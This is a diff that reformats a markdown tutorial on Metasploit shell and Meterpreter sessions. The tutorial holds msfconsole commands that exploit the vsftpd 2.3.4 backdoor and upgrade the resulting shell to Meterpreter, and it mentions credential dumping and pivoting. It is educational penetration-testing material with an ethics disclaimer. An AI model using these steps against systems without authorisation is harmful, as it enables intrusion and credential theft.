@@ -11,92 +11,75 @@ Types of Metasploit Sessions;
 
 1. Shell Sessions – A basic command-line access to the target system, offering minimal functionality.
 2. Command Shell Sessions – A slightly more interactive environment that allows system commands to be executed with better stability.
-3️⃣ VNC Sessions – A graphical interface that enables GUI-based control over the compromised system.
-4️⃣ HTTP/HTTPS Shells – These use HTTP/S communication to bypass firewalls and proxy restrictions, making them stealthier.
-5️⃣ Java Shells – Payloads that exploit Java vulnerabilities to execute commands remotely.
-6️⃣ PowerShell Sessions – Specifically for Windows systems, allowing deep integration with PowerShell scripting.
-7️⃣ Android Meterpreter – A session type designed for Android devices, providing deep access to files, cameras, and system data.
-8️⃣ PHP Web Shells – Used to compromise web servers via vulnerable web applications.
-9️⃣ Custom Sessions – Tailor-made payloads generated using msfvenom for highly specific attack scenarios.
+3. VNC Sessions – A graphical interface that enables GUI-based control over the compromised system.
+4. HTTP/HTTPS Shells – These use HTTP/S communication to bypass firewalls and proxy restrictions, making them stealthier.
+5. Java Shells – Payloads that exploit Java vulnerabilities to execute commands remotely.
+6. PowerShell Sessions – Specifically for Windows systems, allowing deep integration with PowerShell scripting.
+7. Android Meterpreter – A session type designed for Android devices, providing deep access to files, cameras, and system data.
+8. PHP Web Shells – Used to compromise web servers via vulnerable web applications.
+9. Custom Sessions – Tailor-made payloads generated using msfvenom for highly specific attack scenarios.
 
-Shell vs. Meterpreter: Which One to Use?
+### Shell vs. Meterpreter: Which One to Use?
+
 While shell sessions provide only basic access to a target machine, Meterpreter offers a much more powerful and flexible approach to post-exploitation. Meterpreter is a dynamically extensible payload that allows for advanced reconnaissance, privilege escalation, file system manipulation, and pivoting within a network—all without ever writing to disk, making it stealthier.
 
-Key Differences
-Feature	Shell Session	Meterpreter Session
-Functionality	Basic command execution	Advanced post-exploitation toolkit
-Persistence	No built-in persistence	Can be made persistent
-File System Access	Limited	Full file system access
-Privilege Escalation	Manual	Automated with built-in commands
-Stealth	Easily detected	Memory-resident, harder to detect
-Networking	No pivoting capabilities	Can route traffic through target system
-Session Management in Metasploit
+**Key Differences**
+
+  Feature	                        Shell Session	                     Meterpreter Session
+* Functionality	               Basic command execution	          Advanced post-exploitation toolkit
+* Persistence	                   No built-in persistence	           Can be made persistent
+* File System Access	              Limited                        	Full file system access
+* Privilege Escalation	              Manual	                      Automated with built-in commands
+* Stealth	                        Easily detected	                  Memory-resident, harder to detect
+* Networking	                   No pivoting capabilities	        Can route traffic through target system
+
+### Session Management in Metasploit
+
 After gaining access to a system, managing sessions efficiently is crucial. The following commands help in handling active sessions within Metasploit:
 
 List active sessions:
-bash
-Copy
-Edit
-sessions -l
+`sessions -l`
+
 Interact with a specific session:
-bash
-Copy
-Edit
-sessions -i <session-id>
+`sessions -i <session-id>`
+
 Upgrade a shell session to Meterpreter:
-bash
-Copy
-Edit
-sessions -u <session-id>
+`sessions -u <session-id>`
+
 Kill a session:
-bash
-Copy
-Edit
-sessions -k <session-id>
-Generating and Using Multiple Sessions
+`sessions -k <session-id>`
+
+### Generating and Using Multiple Sessions
+
 The ability to run multiple sessions is an advantage in penetration testing. The steps below outline how to initiate multiple sessions using Metasploit.
 
-1️⃣ Start Metasploit
+* Start Metasploit
+`sudo msfconsole`
 
-bash
-Copy
-Edit
-sudo msfconsole
-2️⃣ Search for an exploit or payload
+* Search for an exploit or payload
+`search vsftpd`
 
-bash
-Copy
-Edit
-search vsftpd
-3️⃣ Use an exploit and configure the target
-
-bash
-Copy
-Edit
-use exploit/unix/ftp/vsftpd_234_backdoor
+* Use an exploit and configure the target
+`use exploit/unix/ftp/vsftpd_234_backdoor`
 set RHOSTS <target-IP>
 set payload cmd/unix/interact
-4️⃣ Execute the exploit
 
-bash
-Copy
-Edit
-exploit
-5️⃣ View active sessions and upgrade shell to Meterpreter
+* Execute the exploit
+`exploit`
 
-bash
-Copy
-Edit
-sessions -l
-sessions -u 1
-At this point, a Shell Session is upgraded to a Meterpreter Session, allowing deeper system access. With Meterpreter, one can manipulate files, dump credentials, escalate privileges, and pivot through a network to expand an attack surface.
+* View active sessions and upgrade shell to Meterpreter
+`sessions -l`
+`sessions -u 1`
 
-Ethical Considerations and Responsible Usage
+At this point, a **Shell Session** is upgraded to a **Meterpreter Session**, allowing deeper system access. With Meterpreter, one can manipulate files, dump credentials, escalate privileges, and pivot through a network to expand an attack surface.
+
+### Ethical Considerations and Responsible Usage
+
 While Metasploit is a powerful penetration testing tool, its use must align with ethical hacking principles and legal regulations. Conducting unauthorized security assessments, exploiting systems without permission, or misusing these techniques can result in severe legal consequences.
 
 🛑 This project is strictly for educational purposes. The author assumes no responsibility for any misuse or illegal activity. Users must ensure compliance with applicable cybersecurity laws and ethical guidelines.
 
-Conclusion
+### Conclusion
 Understanding Shell and Meterpreter sessions is an essential skill for cybersecurity professionals. While a basic shell provides minimal access, Meterpreter unlocks powerful post-exploitation capabilities that can be leveraged for in-depth security assessments. By mastering session management and payload deployment, security teams can strengthen defenses, mitigate vulnerabilities, and enhance organizational security postures.
 
 🚀 Cybersecurity is a responsibility. Learn it, use it, and protect systems ethically!
